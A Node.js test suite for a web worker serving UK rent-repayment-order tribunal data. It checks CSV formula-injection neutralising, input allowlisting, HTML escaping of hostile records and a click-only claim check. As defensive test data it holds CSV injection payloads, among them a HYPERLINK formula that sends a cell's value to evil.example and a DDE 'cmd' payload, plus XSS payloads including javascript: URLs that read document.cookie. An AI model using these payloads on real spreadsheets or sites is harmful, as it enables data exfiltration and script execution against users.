// node --test tests/  — P31 CSV formula neutralising + calculator input allowlist; P30 /rro result rendering escaping.
// No network: fetch is stubbed.
import test from "node:test";
import assert from "node:assert/strict";
import vm from "node:vm";
import worker from "../worker.js";
import { rroCsvCell, rroResetIsolateStateForTests } from "../src/rro_core.js";

const ORIGIN = "https://parish.technoplusit.co.uk";
const get = (p) => new Request(ORIGIN + p, { headers: { "CF-Connecting-IP": "203.0.113.7" } });
const env = () => { rroResetIsolateStateForTests(); return {}; };
globalThis.fetch = async (u) => { throw new Error("unexpected network call " + u); };

// Minimal RFC 4180 parser (quoted cells, "" escapes, CRLF).
function parseCsv(text) {
  const rows = []; let row = []; let cell = ""; let q = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (q) { if (c === '"') { if (text[i + 1] === '"') { cell += '"'; i++; } else q = false; } else cell += c; continue; }
    if (c === '"') q = true; else if (c === ",") { row.push(cell); cell = ""; }
    else if (c === "\r" && text[i + 1] === "\n") { row.push(cell); rows.push(row); row = []; cell = ""; i++; }
    else if (c === "\n") { row.push(cell); rows.push(row); row = []; cell = ""; }
    else cell += c;
  }
  if (cell !== "" || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
const NUMERIC = /^-?\d+(\.\d+)?$/;
function assertNoFormulaCells(label, text) {
  for (const row of parseCsv(text)) for (const cell of row) {
    if (NUMERIC.test(cell)) continue;
    assert.doesNotMatch(cell, /^[=+\-@\t\r]/, label + ": formula-like cell " + JSON.stringify(cell.slice(0, 60)));
  }
}

test("P31 rroCsvCell: neutralises = + - @ TAB CR prefixes; keeps plain (incl. negative) numbers numeric; quotes as RFC 4180", () => {
  assert.equal(rroCsvCell('=HYPERLINK("http://evil.example","x")'), '"\'=HYPERLINK(""http://evil.example"",""x"")"');
  assert.equal(rroCsvCell("+1+1"), "'+1+1");
  assert.equal(rroCsvCell("-2+3+cmd|' /C calc'!A0"), "'-2+3+cmd|' /C calc'!A0");
  assert.equal(rroCsvCell("@SUM(A1:A2)"), "'@SUM(A1:A2)");
  assert.equal(rroCsvCell("\t=1"), "'\t=1");
  assert.equal(rroCsvCell("\r=1"), "\"'\r=1\"");
  // Legitimate negative / decimal numbers are data, not formulas: unchanged (documented in src/rro_core.js).
  assert.equal(rroCsvCell(-12.5), "-12.5");
  assert.equal(rroCsvCell("-12.5"), "-12.5");
  assert.equal(rroCsvCell("-40"), "-40");
  assert.equal(rroCsvCell(0), "0");
  assert.equal(rroCsvCell(NaN), "");
  assert.equal(rroCsvCell(null), "");
  assert.equal(rroCsvCell("a,b"), '"a,b"');
  assert.equal(rroCsvCell("LON/00AJ/HMG/2025/0666"), "LON/00AJ/HMG/2025/0666");
});

const EVIL = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
test("P31 /api/rro-calculate?format=csv: hostile region / mitigation / offence never reach the CSV as formulas", async () => {
  const qs = new URLSearchParams({ monthly_rent_gbp: "1800", months_unlicensed: "12", region: EVIL, mitigation_factors: EVIL + ",first_offence,@cmd", offence_type: "+cmd|' /C calc'!A0", format: "csv" });
  const r = await worker.fetch(get("/api/rro-calculate?" + qs), env());
  assert.equal(r.status, 200);
  const csv = await r.text();
  assert.doesNotMatch(csv, /HYPERLINK|evil\.example|cmd\|/i);
  assertNoFormulaCells("calculate csv", csv);
  const summary = parseCsv(csv).find((row) => row[0] === "CALCULATION_SUMMARY");
  assert.equal(summary[2], "All"); // unknown region -> all regions, not echoed
  assert.equal(summary[4], "Unlicensed HMO (s.72)"); // offence clamped to a canonical label
  assert.equal(summary[9].split(";")[0], "first_offence"); // only code-shaped factors survive
  // POST JSON and the markdown export get the same clamping.
  const post = await worker.fetch(new Request(ORIGIN + "/api/rro-calculate", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ region: EVIL, mitigation_factors: [EVIL], offence_type: EVIL, format: "markdown" }) }), env());
  assert.doesNotMatch(await post.text(), /HYPERLINK|evil\.example/);
});

test("P31 calculator: allowlisted region (any case) and clamped numbers", async () => {
  const j = await (await worker.fetch(get("/api/rro-calculate?region=northern&monthly_rent_gbp=99999999&months_unlicensed=99&utilities_included_monthly_gbp=-5&offence_type=Selective%20Licensing"), env())).json();
  const s = JSON.stringify(j);
  assert.match(s, /"region":"Northern"/);
  assert.match(s, /Selective Licensing \(s\.95\)/);
  assert.ok(!/99999999/.test(s));
  const csv = await (await worker.fetch(get("/api/rro-calculate?region=Northern&format=csv"), env())).text();
  assert.equal(parseCsv(csv).find((row) => row[0] === "CALCULATION_SUMMARY")[2], "Northern");
});

test("P31 search CSV (/api/rro-search?format=csv): every cell is formula-safe", async () => {
  const csv = await (await worker.fetch(get("/api/rro-search?format=csv&region=" + encodeURIComponent(EVIL)), env())).text();
  assertNoFormulaCells("search csv", csv);
  const all = await (await worker.fetch(get("/api/rro-search?format=csv&limit=500"), env())).text();
  assert.ok(parseCsv(all).length > 100, "rows " + parseCsv(all).length);
  assertNoFormulaCells("search csv (all)", all);
});

// ---------------------------------------------------------------- P30: run the real /rro inline script against a hostile record
async function renderResults(records) {
  const html = await (await worker.fetch(get("/rro"), env())).text();
  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
  assert.equal(scripts.length, 1);
  const els = new Map();
  const el = (id) => { if (!els.has(id)) els.set(id, { id, value: "", textContent: "", innerHTML: "", href: "", addEventListener() {} }); return els.get(id); };
  let searchCalls = 0;
  const ctx = {
    document: { getElementById: el },
    window: { location: { search: "" } },
    URL, URLSearchParams, JSON, Number, String, Array, Math, console,
    fetch: (u) => {
      if (String(u).startsWith("/api/rro-search")) { searchCalls++; return Promise.resolve({ ok: true, json: async () => ({ stats: { total_matched: records.length, median_award_pct: 1, mean_award_pct: 1, total_claimed_gbp: 1, total_awarded_gbp: 1 }, results: records }) }); }
      return new Promise(() => {}); // claim check etc.: never settles, nothing else runs
    },
  };
  vm.createContext(ctx);
  vm.runInContext(scripts[0], ctx); // throws on a syntax error
  for (let i = 0; i < 20 && !el("resultsBody").innerHTML.includes("<tr>"); i++) await new Promise((r) => setTimeout(r, 5));
  assert.equal(searchCalls >= 1, true);
  return el("resultsBody").innerHTML;
}

test("P30: the /rro inline script parses (it used to have quote/newline syntax errors) and renders a normal record with its GOV.UK PDF link", async () => {
  const out = await renderResults([{ case_ref: "LON/00AJ/HMG/2025/0666", decision_date: "2025-06-01", region: "London", title: "Flat 9", offence_type: "Unlicensed HMO (s.72)", claimed_gbp: 21000, awarded_gbp: 8400, award_pct_of_rent: 40, award_source: "direct", respondent_type: "individual", mitigation_factors: ["first_offence"], judge_summary: "Summary & reasons", pdf_url: "https://assets.publishing.service.gov.uk/media/abc/LON_00AJ.pdf" }]);
  assert.match(out, /<a href="https:\/\/assets\.publishing\.service\.gov\.uk\/media\/abc\/LON_00AJ\.pdf" target="_blank" rel="noopener noreferrer">GOV\.UK PDF/);
  assert.match(out, /Summary &amp; reasons/);
  assert.match(out, /<span class="tag">first_offence<\/span>/);
});

test("P30: hostile record — script/attribute injection in every field is escaped; javascript: and other-host PDF URLs are not linked", async () => {
  const X = '<script>alert(1)</script><img src=x onerror="alert(2)">"\'';
  const base = { case_ref: X, decision_date: X, region: X, title: X, offence_type: X, claimed_gbp: X, awarded_gbp: X, award_pct_of_rent: X, award_source: X, respondent_type: X, mitigation_factors: [X, X], judge_summary: X };
  const urls = [
    "javascript:alert(document.cookie)",
    "JaVaScRiPt:alert(1)",
    "https://evil.example/x.pdf",
    "http://assets.publishing.service.gov.uk/x.pdf",
    "https://assets.publishing.service.gov.uk.evil.example/x.pdf",
    "https://user:pw@assets.publishing.service.gov.uk/x.pdf",
    "https://assets.publishing.service.gov.uk:8443/x.pdf",
    '" onmouseover="alert(3)',
    "data:text/html,<script>alert(4)</script>",
  ];
  const out = await renderResults(urls.map((pdf_url) => ({ ...base, pdf_url })));
  assert.doesNotMatch(out, /<script/i);
  assert.doesNotMatch(out, /<img/i);
  // Only the template's own tags exist as real markup (the hostile text survives only as escaped text).
  const tags = [...out.matchAll(/<\/?([a-zA-Z][\w-]*)/g)].map((m) => m[1].toLowerCase());
  for (const t of tags) assert.ok(["tr", "td", "strong", "br", "span", "code", "div"].includes(t), "unexpected tag " + t);
  assert.doesNotMatch(out, /javascript:/i);
  assert.doesNotMatch(out, /evil\.example/);
  assert.doesNotMatch(out, /<a /);
  assert.match(out, /&lt;script&gt;alert\(1\)&lt;\/script&gt;&lt;img src=x onerror=&quot;alert\(2\)&quot;&gt;&quot;&#39;/);
  // only the fixed markup's own attributes remain
  const attrs = [...out.matchAll(/<(\w+)((?:\s+[\w-]+="[^"]*")*)\s*\/?>/g)].flatMap((m) => [...m[2].matchAll(/([\w-]+)="/g)].map((a) => a[1]));
  for (const a of attrs) assert.ok(["class", "style"].includes(a), "unexpected attribute " + a);
});

// ---------------------------------------------------------------- P37: claim check only on explicit user action
async function loadRroScript() {
  const html = await (await worker.fetch(get("/rro"), env())).text();
  const script = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1])[0];
  const els = new Map(); const listeners = new Map();
  const el = (id) => {
    if (!els.has(id)) els.set(id, { id, value: id === "privateText" ? "Draft claim text" : "", textContent: "", innerHTML: "", href: "",
      addEventListener(type, fn) { listeners.set(id + ":" + type, fn); } });
    return els.get(id);
  };
  const audits = [];
  const ctx = {
    document: { getElementById: el }, window: { location: { search: "" } },
    URL, URLSearchParams, JSON, Number, String, Array, Math, console, setTimeout,
    fetch: (u, init) => {
      if (String(u).startsWith("/api/rro-audit-pdf")) { audits.push(init); return Promise.resolve({ ok: true, json: async () => ({ status: "ok" }) }); }
      if (String(u).startsWith("/api/rro-search")) return Promise.resolve({ ok: true, json: async () => ({ stats: { total_matched: 0, median_award_pct: 0, mean_award_pct: 0, total_claimed_gbp: 0, total_awarded_gbp: 0 }, results: [] }) });
      return new Promise(() => {});
    },
  };
  vm.createContext(ctx);
  vm.runInContext(script, ctx);
  await new Promise((r) => setTimeout(r, 30));
  return { html, audits, listeners, el };
}

test("P37: the /rro script sends no claim-check request on load; an explicit click still runs it; textarea has autocomplete=off", async () => {
  const { html, audits, listeners, el } = await loadRroScript();
  assert.equal(audits.length, 0, "no POST /api/rro-audit-pdf on page load");
  assert.match(html, /<textarea id="privateText" autocomplete="off">/);
  const click = listeners.get("auditBtn:click");
  assert.equal(typeof click, "function", "auditBtn has a click handler");
  await click();
  await new Promise((r) => setTimeout(r, 10));
  assert.equal(audits.length, 1, "explicit click sends exactly one claim check");
  assert.equal(audits[0].method, "POST");
  assert.deepEqual(JSON.parse(audits[0].body), { claim_text: "Draft claim text" });
  assert.match(el("auditOutput").textContent, /"status": "ok"/);
});
